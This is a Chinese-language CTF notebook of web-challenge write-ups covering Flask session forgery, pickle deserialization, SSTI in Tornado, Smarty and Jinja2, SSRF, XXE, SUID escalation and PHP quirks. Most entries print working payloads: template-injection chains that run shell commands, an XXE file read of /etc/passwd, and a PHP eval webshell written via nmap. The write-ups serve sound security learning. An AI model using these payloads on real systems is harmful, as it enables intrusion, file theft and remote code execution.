> 伪造就是要得到secret_key

这一题的secret_key就是在源码中，为ckj123

这题还需要解密一下这题的session的数据，再进行修改

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode
 
def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)
 
    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True
 
    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of an exception')
 
    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before decoding the payload')
 
    return session_json_serializer.loads(payload)
 
if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))   
```

![image-20250208174017955](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208174017955.png)

复制cookie后运行脚本

![image-20250207101757008](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208174011875.png)

得到

```
{'_fresh': True, '_id': b'3eb425195fda4275394beaaff08a09a52920103838c6aca74311fa1b3a4f7752a58cc80509d6d12a4920606ffdb72d36196b1f1e99eba674fc0eccd3f8d4a394', 'csrf_token': b'20a19bafb65c0325b9748f773d1661acf943c522', 'image': b'EMrw', 'name': 'marin', 'user_id': '10'}
```

要将用户名修改为admin再加密

加密有个github项目[Releases · noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager/releases)

```bash
python flask_session_cookie_manager3.py encode  -s "ckj123" -t "{'_fresh': True, '_id': b'3eb425195fda4275394beaaff08a09a52920103838c6aca74311fa1b3a4f7752a58cc80509d6d12a4920606ffdb72d36196b1f1e99eba674fc0eccd3f8d4a394', 'csrf_token': b'20a19bafb65c0325b9748f773d1661acf943c522', 'image': b'EMrw', 'name': 'admin', 'user_id': '10'}"
```

![image-20250208174011875](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208175826893.png)

修改cookie，就成功获得flag

![image-20250208175930822](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209104449314.png)

第二种方法

Unicode欺骗（能想出这个方法真是神了orz）

查看源码，会先用strlower将name处理为小写，使用的是`noderprep.prepare()`
这个函数对Modifier Letter Capital转换的时候，有一个顺序

```
ᴬᴰᴹᴵᴺ
使用一次noderprep.prepare()==> ADMIN
再使用一次noderprep.prepare()==> admin
```

就先用ᴬᴰᴹᴵᴺ注册一次，登录时被使用了一次

![image-20250208191746723](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208191746723.png)

然后进行修改密码，就会再使用一次，就会修改admin的密码，然后再使用修改的密码登录就可以了

#### [AuroraCTF] Share Page

进入网站是登录后是一个输入框，然后可以显示在一个页面中，一开始xss但是没有管理员进入，但是可以用ssrf，过滤了很多东西，查看{{config}}，发现了东西

![image-20250329162910630](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250329162910630.png)

猜测是session的内容，解密一下session，当时就是卡在这里不会了

![image-20250329162948938](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250329162948938.png)

这个参数是pickle序列化后的，特征应该是g开头，并且前面有很多a

pickle有一个漏洞，这个 `__reduce__`方法，会导致在反序列化时，直接执行代码

![image-20250329163135491](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250329163135491.png)

所以只要在这里就能rce

但是这个没有回显，并且不出网，在源代码发现有一个静态文件夹可以访问，所以就写入这个文件夹

```python
class person():
    def __reduce__(self):
        return (eval, ("print(__import__('os').popen('ls / > static/1.txt').read())",))
```

得到的

```
gASVVwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIw7cHJpbnQoX19pbXBvcnRfXygnb3MnKS5wb3BlbignbHMgLyA+IHN0YXRpYy8xLnR4dCcpLnJlYWQoKSmUhZRSlC4=
```

![image-20250329163318466](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250329163318466.png)

![image-20250329163419879](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250329163419879.png)

## 模板注入

敏感变量：config / request / lipsum / session / g

---

#### [护网杯 2018]easy_tornado

看到题目不懂tornado是什么东西，搜了一下发现是一个web服务器框架，打开题目页面，有三个链接，分别对应读取三个文件

![image-20250209104424566](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209104424566.png)

这个提示应该就是说的是filehash的值

![image-20250209104449314](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209110254820.png)

在flag.txt中发现flag在这个文件中，但是直接读取就是error，尝试了一下就是hash的问题，因为把原本能读取的文件的filehash修改了也会error，所以要拿到这个文件的filehash，需要cookie_secret这个东西，不知道怎么获取，直接搜这个漏洞发现有一个文件读取和模板注入，不知道是哪个

查wp发现是模板注入，不知道什么是模板注入查了一下
[1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/13508538.html)

**SSTI** 就是服务器端模板注入

当前使用的框架，python的flask、java的spring等都是比较用户的输入进入控制器，然后根据请求类型和请求的指令发送给对应的业务模块进行业务逻辑判断，数据库读取，最后把结果返回给视图层，渲染后展示给用户

这个漏洞就是因为服务器端接收到了用户的恶意输入后，没有任何处理就将其作为web模板的一部分，模板引擎在渲染目标时，执行了用户插入的恶意语句，导致了信息泄露、代码执行等问题

模板注入一般都会使用`{{}}`包裹恶意代码，因为在渲染函数中，不会对变量进行渲染，`{{}}`中的内容会被当作变量解析，所以可以实现模板注入

回到这题上面，在error的时候，页面的Error其实就是msg的内容，所以可以在这里进行注入

![image-20250209110254820](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250208175930822.png)

确实有

![image-20250209110342751](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209110342751.png)

在tornado模板中，有些可以快速访问的对象，比如`handler.settings`对象，里面存储着一些环境变量

![image-20250209110943801](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209110943801.png)

成功获得key

```
fececa92-485c-4c3f-baa5-bdd78b9a7fbd3bf9f6cf685a6dd8defadabfb41a03a1
```

```
4794c63bdc1b6d566c11e043bb485027
```

![image-20250209111148401](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250209111148401.png)

#### [BJDCTF2020]The mystery of ip

点击flag页面，发现了我的ip

看hint的源码，发现提示，为什么会发现ip，猜测是X-Forwarded-For头的问题

burp抓包修改发现确实是

![image-20250220161104694](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220161611960.png)

然后就不会了，查wp

发现这里是一个模板注入

```
X-Forwarded-For:{{1*2}}
```

确实输出了2

获取信息

```
X-Forwarded-For:{{config}}
```

![image-20250220161611960](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220161104694.png)

发现是Smarty模板，还是看之前的那个文章

发现可以直接构造命令

```
X-Forwarded-For:{system('ls /')} 
```

![image-20250227155254463](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220162055727.png)

直接查flag

```
X-Forwarded-For:{system('cat /flag')}
```

![image-20250227155147933](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220162110572.png)

#### [HNCTF 2022 WEEK2]ez_SSTI

题目就提示了是ssti，那就找注入点，但是找不到，试了sstimap好像查不到，查看wp发现都是猜测name

后面学的

```
{{"".__class__}}
```

检测字符串的类型是不是str类

![image-20250220162055727](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227155147933.png)

```
{{"".__class__.__base__}}
```

检测父类是不是object

![image-20250220162110572](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227155254463.png)

```
{{"".__class__.__mro__}}
```

如果可能有多个父类，就用`__mro__`检测所有父类

![image-20250227155535057](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227155426930.png)

```
{{"".__class__.__base__.__subclasses__()}}
```

获取父类的全部子类

![image-20250227155426930](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227155703200.png)

然后找到自己需要的类，这里需要找到一个类`<class 'os._wrap_close'>`一般可能都是要找这个，大概在138附近

```
{{"".__class__.__base__.__subclasses__()[137]}}
```

![image-20250227155703200](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227161211530.png)

```
{{"".__class__.__base__.__subclasses__()[137].__init__}}
```

这里是获取类的初始化方法

```
{{"".__class__.__base__.__subclasses__()[137].__init__.__globals__}}
```

获取全局变量

![image-20250227160513551](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250214202244033.png)

```
{{"".__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('ls').read()}}
```

`popen`是用来启动子进程并与其进行交互的函数，运行shell命令，后面的read()是用来读取结果的

![image-20250227161211530](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227161227178.png)

```
{{"".__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('cat flag').read()}}
```

![image-20250227161227178](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227160513551.png)

> `__class__`：返回类型所属对象
>
> `__base__`：返回这个对象所继承的父类
>
> `__mro__`：返回一个包含对所有继承的基类的元组
>
> `__subclasses__`：获取当前类的所有子类
>
> `__init__`：类的初始化方法
>
> `__globals__`：对函数全局变量的字典的引用

#### [GWCTF 2019]你的名字

拿到题目一个输入框，输入什么就会返回什么，测试sql，没试出来

测试ssti，发现传入`{{}}`就会报错，尝试`{% %}`更奇怪

![image-20250226191453561](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250303161959410.png)

然后就很懵了，查看wp

发现确实是使用`{% %}`，但是是使用`print`

然后我尝试使用自己的方法做

```
{%25 print "".__class__.__mro__[2].__subclasses__() %25}
```

还是用`str`类型查找到`object`类找他下面的子类，但是这里好像被删除了，找不到`os`类，我就不会了

并且这里有过滤，需要使用双写绕过

```
{%25 print "".__clmroass__.__mconfigro__[2].__subclmroasses__() %25}
```

查看wp发现这个过滤的方法是有一个黑名单，从中一个个取证循环查找，`config`在最后一个，只要前面的没被检查到，就可以用后面的双写绕过

查看wp发现是用一个`lipsum`来检查

```
{%25 print lipsum %25}
```

```
<function generate_lorem_ipsum at 0x7f7dafa7fed0>
```

这应该是一个`jinja2`中的函数，使用这个函数获取

```
{%25 print lipsum.__globals__ %25}
```

获取`lipsum`的全局变量字典

```
{%25 print lipsum.__globals__.__builtins__ %25}
```

通过`__globals__`间接访问python内置对象

```
{%25 print lipsum.__globals__.__builtins__.__import__('os') %25}
```

通过`import`导入`os`库

```
{%25 print lipsum.__globals__.__builtins__.__import__('os').popen('ls / ').read() %25}
```

最后通过`popen`来执行命令

因为flag在环境变量中，所以最后的payload是

```
{%25 print lipsum.__globals__.__builconfigtins__.__impconfigort__('oconfigs').poconfigpen('env').read() %25}
```

#### [NCTF 2018]flask真香

拿到页面，查看源码和页面都没有东西，但是又页面访问不了，猜测东西就在这

![image-20250407192041917](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250407192041917.png)

确实是模板注入

![image-20250407192116419](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250407192116419.png)

然后开始测试，发现这个好像过滤，而且过滤有两种，一种是报错，一种是无回显

用字符拼接来做

```
{{""['__c''lass__'].__base__['__subcl''asses__']()[342].__init__['__glo''bals__']['po''pen']('ls /').read()}}
```

![image-20250407192708785](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250407192708785.png)

成功得到flag

#### [NCTF 2018]Flask PLUS

这题其实就比上一题多了一些过滤，但是方法是一样的

```
{{""['__cla''ss__'].__base__['__subcl''asses__']()[137]['__in''it__']['__glo''bals__']['po''pen']('cat /Th1s_is__F1114g ').read()}}
```

多过滤了一个 `__init__` 其实没什么影响（

看wp学到另一个方法，用其他方法

`__enter__` 代替 `__init__` ，后面就是一样的，因为这个也会有 `__globals__` 方法可以用

## java

#### [RoarCTF 2019]Easy Java

拿到一个登录页面，有一个help，点进去显示了

```
java.io.FileNotFoundException:{help.docx}
```

知道是java题，但是不知道这题考了什么

查了wp，发现了一个新知识点

> `WEB-INF`主要包含以下文件或目录：
>
> 1. `/WEB-INF/web.xml`：web应用程序配置文件，描述了servlet和其他应用组件配置及命名规则
> 2. `/WEB-INF/classes/`：包含站点所有用的class文件，包含servlet class和非servlet class，不能包含在.jar文件中
> 3. `/WEB-INF/lib/`：存放web应用需要的各种jar文件，放置仅在这个应用中要求使用的jar文件，如数据库驱动jar文件
> 4. `/WEB-INF/src/`：源码目录，按照包名结构放置各个java文件
> 5. `/WEB-INF/database.properties`：数据库配置文件
>
> 通过找到web.xml文件，推断class文件的路径，最后找到class文件

然后这里还有一个不是很懂得东西，这个文件通过get请求无法访问，但是通过post访问就可以下载下来，post参数是什么都行

![image-20250214202244033](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250214202358685.png)

这个help文件中，没有东西，就查看/WEB-INF/web.xml

```
/Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

![image-20250214202358685](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250214202626055.png)

发现了flag

![image-20250214202415423](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250227155535057.png)

按照这个路径

```
/Download?filename=/WEB-INF/classes/com/wm/ctf/FlagController.class
```

因为这个应该就是编译后得java的class文件，得到之后查看

idea反编译后得到flag

![image-20250214202626055](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250214202415423.png)

## SSRF

#### [GKCTF 2020]cve版签到

点击页面，发现有个url参数，那应该就是ssrf的操作了，但是妹想到要访问什么页面，以为就是当前页面

查看wp才发现有提示，用bp抓包，发现两个提示

![image-20250226192610739](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226192557602.png)

看wp还知道了这是cve-2020-7066，搜索一下

* 在php中有一个函数`get_headers `会返回一个包含有服务器响应一个http请求所发送的标头的数组，这个数组的特征就是我们访问ctfhub时的数组

  ![image-20250226192557602](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226192610739.png)

  PHP `7.2.29`之前的`7.2.x`版本、`7.3.16`之前的`7.3.x`版本和`7.4.4`之前的`7.4.x`中使用这个函数，如果url中包含零字符（`%00`），则url就会被截断，导致将信息发送到错误的服务器

回到这题，因为要求要`You just view *.ctfhub.com`，所以最后一定要是这个，就用这个cve来截断

最后的payload

```
?url=http://127.0.0.123%00.ctfhub.com
```

#### [NISACTF 2022]easyssrf

这里学到可以使用file协议读取

![image-20250314192138006](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250314192138006.png)

根据提示查看

![image-20250314192148372](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250314192148372.png)

访问得到

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

得到flag

```
http://node5.anna.nssctf.cn:26539/ha1x1ux1u.php?file=/flag
```

## XSS

#### [AFCTF 2021]BABY_CSP

这题考的是`csp`，也就是内容安全策略

这个之前有笔记

> #### 内容安全策略 `csp`
>
> 在同源策略的基础下，因为限制太强了，对一些大型网站的数据传递不太友好，所以有了内容安全策略
>
> **内容安全策略**类似一种白名单，开发者明确告诉客户端，哪些外部资源是可以加载和执行的，降低注入漏洞的风险
> 默认情况下还会阻止内联脚本的执行（即HTML里的js），只有白名单或安全机制才能允许这些脚本执行
>
> 除了白名单外，CSP还有两种指定可信资源的方式
>
> * nonce： CSP指令可以指定一个随机数，在加载脚本的标签中使用相同的随机数，如果值不对，就不会执行脚本，随机数要在每次加载页面时生成，且不能被攻击者猜到
> * hashes： CSP指令指定受信任脚本的哈希值，如果实际脚本的哈希值和指定的哈希值不同，那么不会执行脚本
>
> 要启用CSP，响应需要包含一个HTTP响应标头，`Content-Security-Policy`标头使用包含策略的值调用，策略本身由一个或多个指令组成，以分号分割
>
> * CSP只能限制`src`的请求

那这题看源码就发现了`nonce`

```html
<script nonce=29de6fde0db5686d>alert(flag)</script>
```

甚至不用突破前面的标签

在源码里找到flag

## XXE

参考[浅谈XML实体注入漏洞 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/175451.html)

#### [NCTF2019]Fake XML cookbook

之前都没见过XXE的题，第一次见

> **XXE** 全称 `XML External Entity Injection` 外部实体注入漏洞
>
> XXE会发生在语言程序解析XML时，没有禁止**外部实体**的加载，导致的漏洞
>
> **XML**
>
> * XML是一种传输和存储数据的标记语言
> * HTML是一种用来创建网页的标准标记语言
>
> HTML5允许在HTML文档中嵌入XML
> XML的特征是标签由用户自定义
>
> 基本语法
> 所有XML都必须有关闭标签
> XML都对大小写敏感
> XML必须正确嵌套
> XML文档必须有根元素
> XML的属性值要加引号
> XML中的空格会被保留，多个空格不会被合并为一个
>
> **特殊字符转义**
>
> |字符|转义|
> | ----| ----|
> |`<`|`&lt;`|
> |`>`|`&gt;`|
> |`&`|`&amp;`|
> |`"`|`&quot;`|
> |`'`|`&apos;`|
>
> **DTD**
> DTD是**XML文档的结构约束**
> DTD有两种用法
>
> 1. 直接写在XML文件内部
>
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE bookstore [   定义这个文档是bookstore类型的文档
> 	<!ELEMENT price (#PCDATA)>定义price元素为#PCDATA类型
> ]>
> ```
>
> 2. 定义在 `.dtd` 文件中，XML引用
>
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE bookstore SYSTEM "bookstore.dtd">
> ```
>
> **DTD语法**
>
> 1. 定义元素
>
> ```xml
> <!ELEMENT 元素名 (内容模型)>
> ```
>
> 2. 定义属性
>
> ```xml
> <!ATTLIST 元素名 属性名 属性类型 默认值>
> ```
>
> 3. 定义实体（重点）
>
> * 内部实体
>
>   ```xml
>   <!ENTITY 实体名 "实体值">
>
>   <!ENTITY marin "1">
>   <h1>&marin;</h1>
>   ```
> * **外部实体**
>
>   ```xml
>   <!ENTITY 实体名 SYSTEM "URL">
>
>   <!ENTITY marin SYSTEM "file:///etc/passwd">
>   <h1>&marin;</h1>
>   ```
>
> **XXE的危害**
>
> 1. 任意文件读取
>    利用伪协议，可以读取文件
>    还分为有回显和无回显两种
> 2. 命令执行
>    php环境下，如果php有装`expect`拓展，就可以命令执行，但是默认没有安装
>
> ```xml
> <?xml version="1.0"?>
> <!DOCTYPE note [
>   <!ENTITY admin SYSTEM "except://ls">
>   ]>
> ```
>
> 3. 内网探测/ssrf
>    XXE可以利用 `http://` 协议，可以发起http请求，探查内网，进行ssrf攻击

回到题目，这题在nss做的时候不知道为什么会报错，在buu里就是正常的

![image-20250408155153641](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408155153641.png)

源码可以看到这个是怎么实现的

```js
function doLogin(){
	var username = $("#username").val();
	var password = $("#password").val();
	if(username == "" || password == ""){
		alert("Please enter the username and password!");
		return;
	}
	
	var data = "<user><username>" + username + "</username><password>" + password + "</password></user>"; 
    $.ajax({
        type: "POST",
        url: "doLogin.php",
        contentType: "application/xml;charset=utf-8",
        data: data,
        dataType: "xml",
        anysc: false,
        success: function (result) {
        	var code = result.getElementsByTagName("code")[0].childNodes[0].nodeValue;
        	var msg = result.getElementsByTagName("msg")[0].childNodes[0].nodeValue;
        	if(code == "0"){
        		$(".msg").text(msg + " login fail!");
        	}else if(code == "1"){
        		$(".msg").text(msg + " login success!");
        	}else{
        		$(".msg").text("error:" + msg);
        	}
        },
        error: function (XMLHttpRequest,textStatus,errorThrown) {
            $(".msg").text(errorThrown + ':' + textStatus);
        }
    }); 
}
```

可以看到整个会发送XML字符串，用burp打开

![image-20250408155429593](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408155429593.png)

在这里尝试加上dtd

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///etc/passwd">
  ]>
<user><username>&admin;</username><password>1</password></user>
```

![image-20250408160131139](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408160131139.png)

成功能获取信息，但是不知道flag会在哪，先拿一下源码

```php
<?php
/**
* autor: c0ny1
* date: 2018-2-7
*/

$USERNAME = 'admin'; //账号
$PASSWORD = '024b87931a03f738fff6693ce0a78c88'; //密码
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try{
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
	$creds = simplexml_import_dom($dom);

	$username = $creds->username;
	$password = $creds->password;

	if($username == $USERNAME && $password == $PASSWORD){
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",1,$username);
	}else{
		$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",0,$username);
	}	
}catch(Exception $e){
	$result = sprintf("<result><code>%d</code><msg>%s</msg></result>",3,$e->getMessage());
}

header('Content-Type: text/html; charset=utf-8');
echo $result;
?>
```

![image-20250408160342140](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408160342140.png)

但是登录后其实没什么用，这个也用不了命令执行，那就直接猜，读到flag

![image-20250408161510334](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250408161510334.png)

## 内部靶场

### [day 1] get_source_code

---

这题点进去F12和右键被禁用了，上网搜索

> 查看页面源代码的方法
>
> 1. F12
> 2. 右键查看源代码
> 3. ctrl+U查看源代码
> 4. 点击浏览器地址栏，再f12
> 5. 点击浏览器地址栏，再crtl+U
> 6. 在页面网址前加上 `view-source`

这题查看源代码后即可

### [day 2] 信息搜集

---

这题教如何使用dirsearch

```bash
dirsearch -u url
```

直接使用dirsearch扫目标url，发现有一个www.zip，拿到之后看到flag1，2和看

```
 /se3ret_route_9b073596ea8496b60841873b8431a1c0.php
```

访问这个发现要求，利用POST方式传入一个参数名为a的数组, 并且它的第一个值为pwnpwnpwn

使用hackbar，要求是要传一个数组，所以要用`a[]`来标识这个是一个数组

![](https://pic1.imgdb.cn/item/67826ef2d0e0a243d4f36e83.png)

### [day 3] rce and escalation

根据教程，先查看r.php发现密码是cmd

![image-20250226193024659](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220164555676.png)

然后发现flag在根目录下

根据提示的命令

```
find / -perm -u=s -type f 2>dev/null
```

> -perm -u=s：表示搜索后面的权限，表示查找具有suid位的文件
>
> -type f ：只查找普通文件
>
> 2>/dev/null：将错误输出重定向到dev/null，避免因为权限不足尝试的大量错误

```
find / -user root -perm -4000 -print 2>/dev/null
```

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

![image-20250220164555676](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220165044919.png)

查到了在这个网站中去查找相关文件https://gtfobins.github.io/的命令

![](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220165132575.png)

```
/usr/bin/time cat /flag_but_cannot_read
```

![image-20250220165044919](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220165206042.png)

成功读取

### [day 4] php特性

```php
<?php
// do you know php function?
// php version: 5.6
highlight_file(__FILE__);
error_reporting(0);
include "izayoishiki.php";

$validate1 = false;
$validate2 = false;
$validate3 = false;
// level 1 intval()
$num = $_GET['caterpie'];
if(isset($num)){
    if($num === "114514"){
        die("nonono"); // if die() function is invoked, the source code will exit.
    }
    if(intval($num, 0) === 114514){
        $validate1 = true;
        echo "<br/>level 1 passed!";
    }
}

// level 2 md5()

$md51 = $_POST['clown'];
$md52 = $_POST['n3rd'];

if(isset($md51) && isset($md52) && $md51 !== $md52 && md5($md51) === md5($md52)){
    $validate2 = true;
    echo "<br/>level 2 passed!";
}

// level 3 int()
// izayoishiki学长很喜欢睡觉哦，让他睡够了就给你flag
$time = $_GET['sleep'];

if(isset($time)){
    if(!is_numeric($time)){
        exit("提供的时间不是一个数字"); // exit() function has the same effect as die()
    }
    else if($time < 86400 * 31){
        exit("这点时间对于izayoishiki来说根本不够");
    }
    else if($time > 86400 * 114){
        exit("izayoishiki学长睡死了");
    }
    else{
        echo "<br/>izyoishiki学长睡得很好, 给你flag:<br/>";
        sleep((int)($time));
        $validate3 = true;
    }
}

if($validate1 && $validate2 && $validate3){
    echo $flag;
}

?>
```

第一关

```php
// level 1 intval()
$num = $_GET['caterpie'];
if(isset($num)){
    if($num === "114514"){
        die("nonono"); // if die() function is invoked, the source code will exit.
    }
    if(intval($num, 0) === 114514){
        $validate1 = true;
        echo "<br/>level 1 passed!";
    }
}
```

这关主要是intval()，参考error神的博客

> intval()特性
>
> 1. 如果参数是字符串，就会返回字符串中第一个不受数字字符之前的整数值
> 2. 如果是intval($num, 0)的话，还有一些特征
> 3. 遇到字母停止读取
> 4. 如果字符串使用0x前缀，使用16进制
> 5. 如果以0开始，使用8进制，否则使用10进制
> 6. e可以表示科学计数法

这题使用字符串就行

```
?caterpie=114514a
```

第二关

```php
// level 2 md5()

$md51 = $_POST['clown'];
$md52 = $_POST['n3rd'];

if(isset($md51) && isset($md52) && $md51 !== $md52 && md5($md51) === md5($md52)){
    $validate2 = true;
    echo "<br/>level 2 passed!";
}

```

这关之前见过，使用数组绕过就行

```
clown[]=1&n3rd[]=2
```

第三关

```php
// level 3 int()
// izayoishiki学长很喜欢睡觉哦，让他睡够了就给你flag
$time = $_GET['sleep'];

if(isset($time)){
    if(!is_numeric($time)){
        exit("提供的时间不是一个数字"); // exit() function has the same effect as die()
    }
    else if($time < 86400 * 31){
        exit("这点时间对于izayoishiki来说根本不够");
    }
    else if($time > 86400 * 114){
        exit("izayoishiki学长睡死了");
    }
    else{
        echo "<br/>izyoishiki学长睡得很好, 给你flag:<br/>";
        sleep((int)($time));
        $validate3 = true;
    }
}

```

这个试着试着就过了，因为会睡那么多时间，并且int识别不了科学计数法，所以使用这个就绕过了

```
sleep=3e6
```

最后的payload

![image-20250220165132575](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250220170452257.png)

## web（未分类）

#### [BUUCTF 2018]Online Tool

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

这里一开始看到的，将`REMOTE_ADDR`参数修改成XFF头，然后获取`host`参数，`escapeshellarg`和`escapeshellcmd`都是对命令进行转义，然后生成`REMOTE_ADDR`和`glzjin`的`md5`值，创建这个沙箱目录，然后切换到这个目录最后会使用`nmap`扫描`host`参数

然后想着是不是要找到这个ip地址，去扫描他，但是没找到方法，查看wp

这里重点是`escapeshellarg`和`escapeshellcmd`两个函数
`escapeshellarg`：转义单个命令行参数，将参数用引号包裹，并转义特殊字符（空格，引号），如果有一个'，会先进行转义，然后在两侧加上一对单引号起连接的作用

`escapeshellcmd`：转义shell中的特殊字符如 `&`, `|`, `;`, `<`, `>`, `(`, `)` 等，以及不配对的`'`

> ```
> e'    ==>    'e '\'' '
> ```
>
> `escapeshellarg`下，会先将后面的`'`转义，然后在两边加上`'`
>
> ```
> 'e '\'' '   ==>     'e '\\'' \'
> ```
>
> 两两单引号配对，最后一个单引号被转义，`\`也被转义

`nmap`写文件
`nmap`中有一个参数`-oG`，可以将命令和结果写到文件中

```
?host = ' <?php @eval($_POST["hack"]);?>   -oG hack.php '
```

![image-20250225163139042](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/屏幕截图%202025-02-24%20172340.png)

就可以拿到flag了

#### [LitCTF 2023]1zjs

拿到页面是一个魔方界面，查看源代码

![屏幕截图 2025-02-24 172340](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225163139042.png)

点进这个页面，发现了东西![image-20250225220307338](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225163201273.png)

访问这个页面，出现了一堆编码了的东西![image-20250225163201273](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225163235089.png)

搜索了一下，发现是jsfuck，解密得到flag

[JSFuck解密-乐乐工具](https://www.leletool.com/tool/jsfuckdecode/)

#### [LitCTF 2023]Vim yyds

使用dirsearch扫描，发现了index.php.swp，访问下载了一个这个文件

![image-20250226183918757](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225220307338.png)

搜索vim泄露，发现可以用vim命令复原这个文件

```
vim -r index.php.swp
```

![image-20250225163235089](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250225215935869.png)

#### [GDOUCTF 2023]hate eat snake

看js的题目，翻看js

![image-20250226184106181](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226183918757.png)

发现被混淆的这里有很像wp的内容，一开始想的是解混淆，但是工具都没什么用，就关注到了这个getScore参数，在前面也可以看到

![image-20250226184031965](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226184031965.png)

尝试在控制台修改

![image-20250225215935869](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250226184106181.png)

就能拿到flag了

查看wp还看到error神的wp了，error神的做法是将混淆的代码输入到控制台中

再复制这一段，输入到控制台

```
